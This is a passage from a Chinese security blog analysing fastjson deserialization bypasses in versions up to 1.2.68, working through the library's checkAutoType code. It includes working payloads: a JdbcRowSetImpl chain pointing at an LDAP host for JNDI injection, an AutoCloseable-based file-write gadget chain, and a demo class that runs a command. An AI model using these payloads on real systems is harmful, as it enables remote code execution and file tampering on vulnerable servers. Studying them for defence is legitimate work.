            if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) &#123;
                clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
                if (clazz != null) &#123;
                    return clazz;
                &#125;
            &#125;
            // 在对比 denyHashCodes 进行黑名单匹配
            // 如果黑名单有匹配并且 TypeUtils.mappings 里没有缓存这个类
            // 则抛出异常
            if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123;
                throw new JSONException(&quot;autoType is not support. &quot; + typeName);
            &#125;
        &#125;
    &#125;

    // 尝试在 TypeUtils.mappings 中查找缓存的 class
    if (clazz == null) &#123;
        clazz = TypeUtils.getClassFromMapping(typeName);
    &#125;

    // 尝试在 deserializers 中查找这个类
    if (clazz == null) &#123;
        clazz = deserializers.findClass(typeName);
    &#125;

    // 如果找到了对应的 class，则会进行 return
    if (clazz != null) &#123;
        if (expectClass != null
                &amp;&amp; clazz != java.util.HashMap.class
                &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;
            throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
        &#125;

        return clazz;
    &#125;

    // 如果没有开启 AutoTypeSupport ，则先匹配黑名单，在匹配白名单，与之前逻辑一致
    if (!autoTypeSupport) &#123;
        long hash = h3;
        for (int i = 3; i &lt; className.length(); ++i) &#123;
            char c = className.charAt(i);
            hash ^= c;
            hash *= PRIME;

            if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0) &#123;
                throw new JSONException(&quot;autoType is not support. &quot; + typeName);
            &#125;

            if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) &#123;
                if (clazz == null) &#123;
                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
                &#125;

                if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;
                    throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
                &#125;

                return clazz;
            &#125;
        &#125;
    &#125;
    // 如果 class 还为空，则使用 TypeUtils.loadClass 尝试加载这个类
    if (clazz == null) &#123;
        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
    &#125;

    if (clazz != null) &#123;
        if (TypeUtils.getAnnotation(clazz,JSONType.class) != null) &#123;
            return clazz;
        &#125;

        if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
                || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
                ) &#123;
            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
        &#125;

        if (expectClass != null) &#123;
            if (expectClass.isAssignableFrom(clazz)) &#123;
                return clazz;
            &#125; else &#123;
                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
            &#125;
        &#125;

        JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);
        if (beanInfo.creatorConstructor != null &amp;&amp; autoTypeSupport) &#123;
            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
        &#125;
    &#125;

    final int mask = Feature.SupportAutoType.mask;
    boolean autoTypeSupport = this.autoTypeSupport
            || (features &amp; mask) != 0
            || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != 0;

    if (!autoTypeSupport) &#123;
        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
    &#125;

    return clazz;
&#125;
</code></pre>
<p>可以看到：当反序列化的类在黑名单中，会有个缓存的判断<code>TypeUtils.getClassFromMapping(typeName) == null</code>，且 TypeUtils.mappings 中没有该类的缓存时，才会抛出异常。</p>
<p>并且在 <code>autoTypeSupport</code> 为默认的 false 判断之前，程序会在<code>mappings</code>和<code>deserializers</code>查找这个要反序列化的类，如果找到了，则就会 return，这就避开下面 autoTypeSupport 默认为 false 时的检查。</p>
<pre><code>    if (clazz == null) &#123;
        clazz = TypeUtils.getClassFromMapping(typeName);
    &#125;

    if (clazz == null) &#123;
        clazz = deserializers.findClass(typeName);
    &#125;

    if (clazz != null) &#123;
        if (expectClass != null
                &amp;&amp; clazz != java.util.HashMap.class
                &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;
            throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
        &#125;

        return clazz;
    &#125;

    if (!autoTypeSupport) &#123;
        ...
        ...
        ...
    &#125;
</code></pre>
<p>所以只需要尝试注入这两个<code>mappings</code>和<code>deserializers</code></p>
<p>先看 <code>deserializers</code> ，位于 <code>com.alibaba.fastjson.parser.ParserConfig.deserializers</code> ，是一个 IdentityHashMap，能向其中赋值的函数有：</p>
<p><img src="/images/20230507000413.png"></p>
<ul>
<li><code>getDeserializer()</code>：这个类用来加载一些特定类，以及有 <code>JSONType</code> 注解的类，在 put 之前都有类名及相关信息的判断，无法为我们所用。</li>
<li><code>initDeserializers()</code>：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。</li>
<li><code>putDeserializer()</code>：被前两个函数调用，我们无法控制入参。</li>
</ul>
<p>再来看 <code>mappings</code>,这是一个 ConcurrentHashMap 对象，能向其中赋值的函数有：</p>
<p><img src="/images/20230507000714.png"></p>
<ul>
<li><code>addBaseClassMappings()</code>：无入参，加载</li>
<li><code>loadClass()</code>：可以利用</li>
</ul>
<p><code>loadClass()</code>有三个重载方法：</p>
<ul>
<li><code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache)</code>：调用链均在 <code>checkAutoType()</code> 和 <code>TypeUtils</code> 里自调用，略过。</li>
<li><code>Class&lt;?&gt; loadClass(String className)</code>：除了自调用，有一个 <code>castToJavaBean()</code> 方法，暂未研究。</li>
<li><code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader)</code>：方法调用三个参数的重载方法，并添加参数 true ，也就是会加入参数缓存中，</li>
</ul>
<p>看看哪里会调用三个参数的重载方法：</p>
<p><img src="/images/20230507001223.png"></p>
<p>在<code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code>,<br>首先需要<code>if (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) </code>，然后<code>if (clazz == Class.class)</code><br>首先调用parser.parse解析”val”这个value中的内容，放入<code>objVal</code>中</p>
<p><img src="/images/20230507002116.png"></p>
<p><code>objVal</code>会强转为String放入<code>strVal</code>中，之后当<code>clazz</code>为<code>Class.class</code>时候，clazz是@type中加载的class对象，并且不在黑名单之中，传入<code>TypeUtils.loadClass</code>方法中，放入<code>mappings</code>中缓存起来</p>
<p><img src="/images/20230507002629.png"></p>
<p>下一次调用<code>checkAutoType() </code>方法会先从缓存中取出，导致绕过</p>
<p>payload:</p>
<pre><code>&#123;&quot;1azy&quot;: &#123;&quot;@type&quot;: &quot;java.lang.Class&quot;,&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;2azy&quot;: &#123;&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:1234/a&quot;,&quot;autoCommit&quot;: true&#125;&#125;
</code></pre>
<h1 id="fastjson-1-2-68"><a href="#fastjson-1-2-68" class="headerlink" title="fastjson-1.2.68"></a>fastjson-1.2.68</h1><p>在 <code>MiscCodec</code> 处理 Class 类的地方，设置了cache 为 false ，并且 <code>loadClass</code> 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。</p>
<blockquote>
<p>影响版本：fastjson &lt;&#x3D; 1.2.68</p>
</blockquote>
<p>该版本加入了<code>safeMode</code>,如果开启会直接抛出异常，跳过 <code>checkAutoType</code></p>
<p><img src="/images/20230507140909.png"></p>
<p>但是<code>checkAutoType</code>依然存在一种绕过方式：利用 <code>expectClass</code> 绕过 <code>checkAutoType()</code>。</p>
<p>在下面有这么一段逻辑，<code>expectClass</code>是<code>checkAutoType</code>中的参数，<code>clazz</code>是传入的类名<code>loadClass</code>后的Class对象，需要在黑名单以外，类名需要是<code>expectClass</code>的子类或实现</p>
<pre><code>if (clazz != null) &#123;
    if (expectClass != null
            &amp;&amp; clazz != java.util.HashMap.class
            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;
        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
    &#125;

    return clazz;
&#125;
</code></pre>
<p>所以只需要<code>expectClass</code>可控，并且类名传入<code>expectClass</code>的子类或实现，去寻找对应调用<code>checkAutoType()</code>方法处：</p>
<ul>
<li><p><code>ThrowableDeserializer#deserialze()</code></p>
</li>
<li><p><code>JavaBeanDeserializer#deserialze()</code></p>
</li>
</ul>
<p><img src="/images/20230507143418.png"></p>
<p><code>ThrowableDeserializer#deserialze()</code> 方法直接将 <code>@type</code> 后的类传入 <code>checkAutoType()</code> ，并且 expectClass 为 <code>Throwable.class</code>。</p>
<p><img src="/images/20230507143601.png"></p>
<p>通过 <code>checkAutoType()</code> 之后，将使用 <code>createException</code> 来创建异常类的实例。</p>
<p><img src="/images/20230507144025.png"></p>
<p>我们需要找到 <code>Throwable</code> 的子类，这个类的 getter&#x2F;setter&#x2F;static block&#x2F;constructor 中含有具有威胁的代码逻辑。</p>
<p>与 <code>Throwable</code> 类似地，还有 <code>AutoCloseable</code> ，总结下使用 <code>AutoCloseable</code> 以及其子类可以绕过 <code>checkAutoType()</code> ：<br>第一，因为 <code>AutoCloseable</code> 在<code>TypeUtils#mappings</code>中，并且不在黑名单中</p>
<pre><code>if (expectClass == null) &#123;
    expectClassFlag = false;
&#125; else &#123;
    if (expectClass == Object.class
            || expectClass == Serializable.class
            || expectClass == Cloneable.class
            || expectClass == Closeable.class
            || expectClass == EventListener.class
            || expectClass == Iterable.class
            || expectClass == Collection.class
            ) &#123;
        expectClassFlag = false;
    &#125; else &#123;
        expectClassFlag = true;
    &#125;
&#125;
</code></pre>
<p><img src="/images/20230507144756.png"></p>
<p>第二，黑名单类，fastjson 在 denyHashCodes 里几乎把常见的容易造成漏洞的类都加进了黑名单</p>
<p>第三，父类、父接口黑名单，fastjson 在判断期望类之前将继承自 ClassLoader、DataSource、RowSet 的类直接抛出异常。</p>
<pre><code>if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
        || javax.sql.DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
        || javax.sql.RowSet.class.isAssignableFrom(clazz) //
        ) &#123;
    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
&#125;
</code></pre>
<p>而常用的 JNDI RCE 类基本上都继承自 DataSource 和 RowSet，所以能找到的 JNDI gadget 基本都无法在这个漏洞中使用。</p>
<blockquote>
<p>fastjson 小于 1.2.51 时，还是可以通过实现了 RowSet 接口的类进行 JNDI 反序列化</p>
</blockquote>
<p><img src="/images/20230507145625.png"></p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>创建一个实现AutoCloseable的类，setter方法中存在恶意代码</p>
<pre><code>public class VulAutoCloseable implements AutoCloseable&#123;

    private String cmd;

    public void setCmd(String cmd) &#123;
        try &#123;
            Runtime.getRuntime().exec(&quot;calc&quot;);
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125;
        this.cmd = cmd;
    &#125;

    @Override
    public void close() throws Exception &#123;

    &#125;
&#125;
</code></pre>
<p>受害者客户端</p>
<pre><code>public class FastJson_68_Test &#123;
    public static void main(String[] args) &#123;
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String text1 = &quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;com.study.fastjson.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;;
        System.out.println(text1);
        Object obj = JSON.parseObject(text1, Object.class, Feature.SupportNonPublicField);
    &#125;
&#125;
</code></pre>
<h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p><code>DefaultJSONParser#parseObject</code>中,<code>checkAutoType</code>会检查第一个@type的内容，因为<code>java.lang.AutoCloseable</code>在mappings会直接通过</p>
<pre><code>parseObject()&#123;
    ...
    if (!allDigits) &#123;
        clazz = config.checkAutoType(typeName, null, lexer.getFeatures());
    &#125;
    ...
&#125;

checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;
...
...
clazz = TypeUtils.getClassFromMapping(typeName);


    if (clazz != null) &#123;
    if (expectClass != null
            &amp;&amp; clazz != java.util.HashMap.class
            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;
        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
    &#125;

    return clazz;
    &#125;
</code></pre>
<p><code>clazz</code>中存入<code>java.lang.AutoCloseable</code>的class对象，会在后面获取对应的解析器去解析，调用<code>JavaBeanDeserializer#deserialze()</code>，</p>
<pre><code>//获取clazz的解析器
ObjectDeserializer deserializer = config.getDeserializer(clazz);
Class deserClass = deserializer.getClass();
if (JavaBeanDeserializer.class.isAssignableFrom(deserClass)
        &amp;&amp; deserClass != JavaBeanDeserializer.class
        &amp;&amp; deserClass != ThrowableDeserializer.class) &#123;
    this.setResolveStatus(NONE);
&#125; else if (deserializer instanceof MapDeserializer) &#123;
    this.setResolveStatus(NONE);
&#125;
//解析
Object obj = deserializer.deserialze(this, clazz, fieldName);
</code></pre>
<p><code>JavaBeanDeserializer#deserialze</code>会调用重载的方法，最后<code>type</code>里面放的是<code>java.lang.AutoCloseable</code>接口，在<code>deserialze</code>方法内还会调用<code>checkAutoType</code>并且<code>expectClass</code>放入的是<code>java.lang.AutoCloseable</code>的class对象、<code>typeName</code>里面放入的是<code>AutoCloseable</code>的实现类，导致后面的绕过。</p>
<p><img src="/images/20230507171634.png"></p>
<h2 id="寻找Gadget"><a href="#寻找Gadget" class="headerlink" title="寻找Gadget"></a>寻找Gadget</h2><h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><ol>
<li>需要一个通过 set 方法或构造方法指定文件路径的 OutputStream</li>
<li>需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream</li>
<li>需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法 调用传入的 OutputStream 的 flush 方法</li>
</ol>
<hr>
<p>浅蓝师傅的poc：</p>
<pre><code>&#123;
    &quot;stream&quot;: &#123;
        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,
        &quot;targetPath&quot;: &quot;E:/a/pwn.txt&quot;,
        &quot;tempPath&quot;: &quot;E:/a/test.txt&quot;
    &#125;,
    &quot;writer&quot;: &#123;
        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,
        &quot;buffer&quot;: &quot;MWF6eQ==&quot;,
        &quot;outputStream&quot;: &#123;
            &quot;$ref&quot;: &quot;$.stream&quot;
        &#125;,
        &quot;position&quot;: 4
    &#125;,
    &quot;close&quot;: &#123;
        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,
        &quot;out&quot;: &#123;
            &quot;$ref&quot;: &quot;$.writer&quot;
        &#125;
    &#125;
&#125;
</code></pre>
<p>maven依赖：</p>
<pre><code>&lt;dependency&gt;
    &lt;groupId&gt;org.aspectj&lt;/groupId&gt;
    &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;
    &lt;version&gt;1.9.5&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;
    &lt;artifactId&gt;kryo&lt;/artifactId&gt;
    &lt;version&gt;4.0.0&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;
    &lt;artifactId&gt;je&lt;/artifactId&gt;
    &lt;version&gt;18.3.12&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>那么这个 payload 为什么能成功写入文件呢？主要有以下几个需要注意点：</p>
<ul>
<li>AutoCloseable 的接口可以绕过 checkAutoType。</li>
<li>分别找到了不同的实现类来实现不同的功能：创建文件链接、写入内容、write&#x2F;flush 等。</li>
<li>使用了 fastjson 的 ref 进行对象引用，把这些类串联起来。</li>
</ul>
<p>AutoCloseable 为什么可以绕过 checkAutoType 这里不再重复，在我之前的文章也分析过。</p>
<p>这里浅蓝找到了三个类分别实现了不同的功能：</p>
<ul>
<li><code>org.eclipse.core.internal.localstore.SafeFileOutputStream</code>：用来创建文件链接对象和OutputStream。</li>
<li><code>com.esotericsoftware.kryo.io.Output</code>：用来向 OutputStream 中写入文件内容。</li>
<li><code>com.sleepycat.bind.serial.SerialOutput</code>：用来触发 flush 方法将流写回文件中。</li>
</ul>
<h4 id="FastJson构造函数"><a href="#FastJson构造函数" class="headerlink" title="FastJson构造函数"></a>FastJson构造函数</h4><p>FastJson反序列化的时候，普通类（不包括接口和抽象类）是通过反射获取构造函数来生成对象的，最后通过反射调用set方法来设置属性的。<br>而获取构造函数的过程又是怎么样的，他是怎么判断要获取哪个构造器的？<br>在<code>ParserConfig#createJavaBeanDeserializer</code>会通过<code>JavaBeanInfo.build</code>生成一个<code>JavaBeanInfo</code>对象，这是FastJson内部存储反序列化对象信息的类。</p>
<pre><code>public class JavaBeanInfo &#123;

    public final Class&lt;?&gt; clazz;
    public final Class&lt;?&gt; builderClass;
    //无参构造方法放在这
    public final Constructor&lt;?&gt; defaultConstructor;
     //有参构造方法放在这
    public final Constructor&lt;?&gt; creatorConstructor;
    public final Method factoryMethod;
    public final Method buildMethod;
</code></pre>
<p> <code>defaultConstructor</code> 和 <code>creatorConstructor</code> 两个属性，首先看到获取<code>defaultConstructor</code>的方法：</p>
<pre><code>static Constructor&lt;?&gt; getDefaultConstructor(Class&lt;?&gt; clazz, final Constructor&lt;?&gt;[] constructors) &#123;
        if (Modifier.isAbstract(clazz.getModifiers())) &#123;
            return null;
        &#125;

        Constructor&lt;?&gt; defaultConstructor = null;

        for (Constructor&lt;?&gt; constructor : constructors) &#123;
            if (constructor.getParameterTypes().length == 0) &#123;
                defaultConstructor = constructor;
                break;
            &#125;
        &#125;
        if (defaultConstructor == null) &#123;
        ...
        &#125;

        return defaultConstructor;
&#125;
</code></pre>
<p>简单易懂，遍历所有的构造函数，看看其中是否存在无参构造函数，如果存在直接返回。</p>
<p>再看到<code>creatorConstructor</code>的获取方法：</p>
<pre><code>for (Constructor constructor : constructors) &#123;
    Class&lt;?&gt;[] parameterTypes = constructor.getParameterTypes();

    if (className.equals(&quot;org.springframework.security.web.authentication.WebAuthenticationDetails&quot;)) &#123;
        if (parameterTypes.length == 2 &amp;&amp; parameterTypes[0] == String.class &amp;&amp; parameterTypes[1] == String.class) &#123;
            creatorConstructor = constructor;
            creatorConstructor.setAccessible(true);
            paramNames = ASMUtils.lookupParameterNames(constructor);
            break;
        &#125; else &#123;
            continue;
        &#125;
    &#125;

    if (className.equals(&quot;org.springframework.security.web.authentication.preauth.PreAuthenticatedAuthenticationToken&quot;)) &#123;
        if (parameterTypes.length == 3
                &amp;&amp; parameterTypes[0] == Object.class
                &amp;&amp; parameterTypes[1] == Object.class
                &amp;&amp; parameterTypes[2] == Collection.class) &#123;
            creatorConstructor = constructor;
            creatorConstructor.setAccessible(true);
            paramNames = new String[] &#123;&quot;principal&quot;, &quot;credentials&quot;, &quot;authorities&quot;&#125;;
            break;
        &#125; else &#123;
            continue;
        &#125;
    &#125;

    if (className.equals(&quot;org.springframework.security.core.authority.SimpleGrantedAuthority&quot;)) &#123;
        if (parameterTypes.length == 1
                &amp;&amp; parameterTypes[0] == String.class) &#123;
            creatorConstructor = constructor;
            paramNames = new String[] &#123;&quot;authority&quot;&#125;;
            break;
        &#125; else &#123;
            continue;
        &#125;
    &#125;

    //


    boolean is_public = (constructor.getModifiers() &amp; Modifier.PUBLIC) != 0;
    if (!is_public) &#123;
        continue;
    &#125;
    String[] lookupParameterNames = ASMUtils.lookupParameterNames(constructor);
    if (lookupParameterNames == null || lookupParameterNames.length == 0) &#123;
        continue;
    &#125;

    if (creatorConstructor != null
            &amp;&amp; paramNames != null &amp;&amp; lookupParameterNames.length &lt;= paramNames.length) &#123;
        continue;
    &#125;

    paramNames = lookupParameterNames;
    creatorConstructor = constructor;
    &#125;
&#125;
</code></pre>
<p>前面会先调用<code>getCreatorConstructor</code>，判断构造器上有无JSONCreator注解，有的话就用返回注解的构造器，且注解不能作用多个构造器，没有注解的话进入这个循环，会对构造器和它的参数进行一系列判断，从所有的构造方法中获取参数最多的一个。需要注意的是获取参数名称使用的并不是java8中提供的获取方法参数名称的方式，而是通过流读取class文件的的方式来获取的，在<code>ASMUtils.lookupParameterNames</code>方法中。</p>
<pre><code>String resourceName = className.replace(&#39;.&#39;, &#39;/&#39;) + &quot;.class&quot;;
    InputStream is = classLoader.getResourceAsStream(resourceName);

    if (is == null) &#123;
        return new String[0];
    &#125;

    try &#123;
        ClassReader reader = new ClassReader(is, false);
        TypeCollector visitor = new TypeCollector(name, types);
        reader.accept(visitor);
        String[] parameterNames = visitor.getParameterNamesForMethod();
</code></pre>
<p>然后通过构造器的参数名，去获取json中的值，作为构造器实例化的参数值，去实例化构造器（<code>JavaBeanDeserializer#deserialze</code>）</p>
<pre><code>boolean match = parseField(parser, key, object, type,
                        fieldValues == null ? new HashMap&lt;String, Object&gt;(this.fieldDeserializers.length) : fieldValues, setFlags);
...
params = new Object[size];
...
Object param = fieldValues.get(fieldInfo.name);
params[i] = param;
...
object = beanInfo.creatorConstructor.newInstance(params);
</code></pre>
<h4 id="SafeFileOutputStream"><a href="#SafeFileOutputStream" class="headerlink" title="SafeFileOutputStream"></a>SafeFileOutputStream</h4><pre><code>public SafeFileOutputStream(String targetPath, String tempPath) throws IOException &#123;
    this.failed = false;
    this.target = new File(targetPath);
    this.createTempFile(tempPath);
    if (!this.target.exists()) &#123;
        if (!this.temp.exists()) &#123;
            this.output = new BufferedOutputStream(new FileOutputStream(this.target));
            return;
        &#125;

        this.copy(this.temp, this.target);
    &#125;

    this.output = new BufferedOutputStream(new FileOutputStream(this.temp));
&#125;
</code></pre>
<p>在这个两个参数的构造方法中，接收参数 targetPath 和 tempPath。用这两个参数创建对应的File对象，tempPath如果没有传入值会用target的路径再拼接上”.bak”，调用<code>copy</code>方法，创建temp和target的缓冲流，读取temp流中的数据，写入target流中，最后创建了temp的缓冲流，写入this.output属性中</p>
<pre><code>protected void copy(File sourceFile, File destinationFile) throws IOException &#123;
    if (sourceFile.exists()) &#123;
        if (!sourceFile.renameTo(destinationFile)) &#123;
            InputStream source = null;
            OutputStream destination = null;

            try &#123;
                source = new BufferedInputStream(new FileInputStream(sourceFile));
                destination = new BufferedOutputStream(new FileOutputStream(destinationFile));
                this.transferStreams(source, destination);
                destination.close();
            &#125; finally &#123;
                FileUtil.safeClose(source);
                FileUtil.safeClose(destination);
            &#125;

        &#125;
    &#125;
&#125;

protected void transferStreams(InputStream source, OutputStream destination) throws IOException &#123;
    byte[] buffer = new byte[8192];

    while(true) &#123;
        int bytesRead = source.read(buffer);
        if (bytesRead == -1) &#123;
            return;
        &#125;

        destination.write(buffer, 0, bytesRead);
    &#125;
&#125;
</code></pre>
<p>总结：传入一个文件路径，SafeFileOutputStream 就会替我们创建 OutputStream 对象并保存在 <code>this.output</code> 中。利用fastjson实例化有参构造的特性，传入targetPath&#x2F;tempPath 两个参数。</p>
<h4 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h4><pre><code>public void flush() throws KryoException &#123;
    if (this.outputStream != null) &#123;
        try &#123;
            this.outputStream.write(this.buffer, 0, this.position);
            this.outputStream.flush();
        &#125; catch (IOException var2) &#123;
            throw new KryoException(var2);
        &#125;

        this.total += (long)this.position;
        this.position = 0;
    &#125;
&#125;
</code></pre>
<p>Output的flush方法会调用<code>outputStream</code>属性的write和flush方法，去写入<code>buffer</code>属性,长度为<code>position</code>属性。写入点有了，那么我们该如何触发这个flush方法呢。</p>
<h4 id="SerialOutput"><a href="#SerialOutput" class="headerlink" title="SerialOutput"></a>SerialOutput</h4><pre><code>public class SerialOutput extends ObjectOutputStream &#123;
</code></pre>
<p><code>SerialOutput</code>是<code>ObjectOutputStream</code>的子类，在<code>ObjectOutputStream</code>的一个参数<code>OutputStream out</code>的有参构造中，会调用内部类的<code>setBlockDataMode</code>方法</p>
<pre><code>public ObjectOutputStream(OutputStream out) throws IOException &#123;
    verifySubclass();
    bout = new BlockDataOutputStream(out);
    handles = new HandleTable(10, (float) 3.00);
    subs = new ReplaceTable(10, (float) 3.00);
    enableOverride = false;
    writeStreamHeader();
    bout.setBlockDataMode(true);
    if (extendedDebugInfo) &#123;
        debugInfoStack = new DebugTraceInfoStack();
    &#125; else &#123;
        debugInfoStack = null;
    &#125;
&#125;
</code></pre>
<p>内部类的<code>setBlockDataMode</code>方法会调用<code>drain()</code>方法</p>
<pre><code>boolean setBlockDataMode(boolean mode) throws IOException &#123;
    if (blkmode == mode) &#123;
        return blkmode;
    &#125;
    drain();
    blkmode = mode;
    return !blkmode;
&#125;
</code></pre>
<p><code>drain</code>方法中会调用有参构造传入的out的<code>write</code>方法，</p>
<pre><code>void drain() throws IOException &#123;
    if (pos == 0) &#123;
        return;
    &#125;
    if (blkmode) &#123;
        writeBlockHeader(pos);
    &#125;
    \\调用调用有参构造传入的out的write方法
    out.write(buf, 0, pos);
    pos = 0;
&#125;
</code></pre>
<p>这时会调用Output的<code>public void write(byte[] bytes, int offset, int length)</code>，里面会调用<code>this.writeBytes(bytes, offset, length);</code>，<code>writeBytes</code>方法中会调用<code>require</code>方法，<code>require</code>方法中会调用我们熟悉的<code>flush</code>方法，从而将缓冲流的数据写入。</p>
<pre><code>public void write(byte[] bytes, int offset, int length) throws KryoException &#123;
    //调用
    this.writeBytes(bytes, offset, length);
&#125;

public void writeBytes(byte[] bytes, int offset, int count) throws KryoException &#123;
    if (bytes == null) &#123;
        throw new IllegalArgumentException(&quot;bytes cannot be null.&quot;);
    &#125; else &#123;
        int copyCount = Math.min(this.capacity - this.position, count);

        while(true) &#123;
            System.arraycopy(bytes, offset, this.buffer, this.position, copyCount);
            this.position += copyCount;
            count -= copyCount;
            if (count == 0) &#123;
                return;
            &#125;

            offset += copyCount;
            copyCount = Math.min(this.capacity, count);
            //调用
            this.require(copyCount);
        &#125;
    &#125;
&#125;

protected boolean require(int required) throws KryoException &#123;
    if (this.capacity - this.position &gt;= required) &#123;
        return false;
    &#125; else if (required &gt; this.maxCapacity) &#123;
        throw new KryoException(&quot;Buffer overflow. Max capacity: &quot; + this.maxCapacity + &quot;, required: &quot; + required);
    &#125; else &#123;
        //调用flush
        this.flush();
        ...
    &#125;
&#125;
</code></pre>
<p>总结：在<code>SerialOutput</code>的有参构造中传入<code>Output</code>对象，就可以触发他的<code>flush</code>方法。</p>
<h4 id="fastjson对象引用"><a href="#fastjson对象引用" class="headerlink" title="fastjson对象引用"></a>fastjson对象引用</h4><p>从 fastjson 1.2.36开始，可以通过 <code>$ref</code> 指定被引用的属性。JavaBeanDeserializer 支持 $ref 这种技巧，ThrowableDeserializer 不支持，后者没有parseField() 方法。</p>
<p>fastjson 默认提供对象引用功能，在传输的数据中出现相同的对象时，fastjson 默认开启引用检测将相同的对象写成引用的形式，对应如下：</p>
<table>
<thead>
<tr>
<th>引用</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>&quot;$ref&quot;:&quot;..&quot;</code></td>
<td>上一级</td>
</tr>
<tr>
<td><code>&quot;$ref&quot;:&quot;@&quot;</code></td>
<td>当前对象，也就是自引用</td>
</tr>
<tr>
<td><code>&quot;$ref&quot;:&quot;$&quot;</code></td>
<td>根对象</td>
</tr>
<tr>
<td><code>&quot;$ref&quot;:&quot;$.children.0&quot;</code></td>
<td>基于路径的引用，相当于 root.getChildren().get(0)</td>
</tr>
</tbody></table>
<p><img src="/images/20230522175957.png"></p>
<p>使用 $ref 关键字进行引用的调用，完成 payload 的串联。但是这三个类库一般在真实环境中遇不到。<strong>所以需要找一个更常用的库来寻找利用链</strong>。</p>
<h3 id="commons-io文件读写"><a href="#commons-io文件读写" class="headerlink" title="commons-io文件读写"></a>commons-io文件读写</h3><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><pre><code>&lt;dependency&gt;
    &lt;groupId&gt;commons-io&lt;/groupId&gt;
    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;
    &lt;version&gt;2.11.0&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<h4 id="CharSequenceInputStream"><a href="#CharSequenceInputStream" class="headerlink" title="CharSequenceInputStream"></a>CharSequenceInputStream</h4><pre><code>public CharSequenceInputStream(final CharSequence s, final String charset, int bufferSize) &#123;
    this(s, Charset.forName(charset), bufferSize);
&#125;

public CharSequenceInputStream(final CharSequence s, final Charset charset, int bufferSize) &#123;
    super();
    this.encoder = charset.newEncoder()
        .onMalformedInput(CodingErrorAction.REPLACE)
        .onUnmappableCharacter(CodingErrorAction.REPLACE);
    this.bbuf = ByteBuffer.allocate(bufferSize);
    this.bbuf.flip();
    this.cbuf = CharBuffer.wrap(s);
    this.mark = -1;
&#125;
</code></pre>
